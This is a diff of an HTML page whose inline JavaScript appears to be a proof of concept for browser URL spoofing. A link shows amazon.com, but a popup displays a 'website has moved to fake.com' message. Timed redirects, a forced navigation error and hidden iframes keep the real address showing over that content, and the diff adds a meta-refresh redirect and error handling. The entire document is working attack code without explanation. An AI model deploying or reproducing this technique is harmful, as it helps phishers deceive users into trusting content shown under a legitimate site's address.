@@ -1,6 +1,7 @@
-
 <body>
-<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
+<a id="test" href="https://www.amazon.com/" onclick="foo(); return false;">
+https://www.amazon.com/
+</a>
 </body>
 
 <script>
@@ -10,67 +11,81 @@ var t;
 var z;
 
 if(location.href.indexOf("fake") !== -1){
-document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
+    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
 }
 
+function addMetaRedirect(url){
+    var meta = document.createElement("meta");
+    meta.httpEquiv = "refresh";
+    meta.content = "0;url=" + url;
+    document.head.appendChild(meta);
+}
 
 function foo(){
 
-document.getElementById("test").href="#";
+    document.getElementById("test").href="#";
 
-w = window.open("?fake");
+    w = window.open("?fake");
 
-t = setInterval('bar()',1);
+    t = setInterval(bar,1);
 
 }
 
 function bar(){
 
-if(w.location.href !== 'about:blank'){
+    try{
+        if(w.location.href !== 'about:blank'){
 
-alert("Redirecting");
+            alert("Redirecting");
 
-document.body.innerHTML = "<h1>Redirecting</h1>";
+            document.body.innerHTML = "<h1>Redirecting</h1>";
 
-slow();
+            slow();
 
-w.location.href = 'https://www.amazon.com/';
+            // popup redirect
+            w.location.href = 'https://www.amazon.com/';
 
-clearInterval(t);
+            // main page meta refresh
+            addMetaRedirect("https://www.amazon.com/");
 
-z = setInterval('baz()',1);
+            clearInterval(t);
 
-}
+            z = setInterval(baz,1);
+        }
+    }catch(e){
+        clearInterval(t);
+    }
 
 }
 
 function baz(){
-try{
-w.location.href !== 'about:blank';
+    try{
+        w.location.href !== 'about:blank';
+    }
+    catch (e){
+
+        //stop page loading
+        w.location.href='https://www.google.com/csi';
+        clearInterval(z);
+
+        setTimeout(function(){
+            alert("ok");
+            window.location.href='about:blank';
+            window.close();
+        },3000);
+    }
 }
-catch (e){
 
-//stop page loading
-w.location.href='https://www.google.com/csi';
-clearInterval(z);
-
-//Make sure the old content is not cleared
-setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
-}
-
-}
-
-
-//slow down the website
+// slow down the website
 function slow() {
-for (i=0; i<10; i++ ) {
+    for (var i=0; i<10; i++ ) {
 
-iframe = document.createElement("iframe");
-iframe.src = 'https://www.amazon.com/';
-iframe.style = 'display:none';
-document.body.appendChild(iframe);
+        var iframe = document.createElement("iframe");
+        iframe.src = 'https://www.amazon.com/';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
 
-}
+    }
 }
 
 </script>
